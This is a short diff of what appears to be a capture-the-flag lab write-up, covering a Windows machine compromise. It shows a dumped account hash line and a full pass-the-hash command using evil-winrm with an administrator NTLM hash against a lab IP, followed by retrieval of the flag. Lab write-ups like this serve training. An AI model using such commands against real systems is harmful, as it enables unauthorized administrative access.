@@ -21,6 +21,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 We can either crack the hash or use a Pass The Hash attack.
 
 We can pass the hash with `evil-winrm`
+
 `evil-winrm -i 10.10.127.164 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"`
 
 This gives us root. We can grab the flag at `c:\users\administrator\desktop`
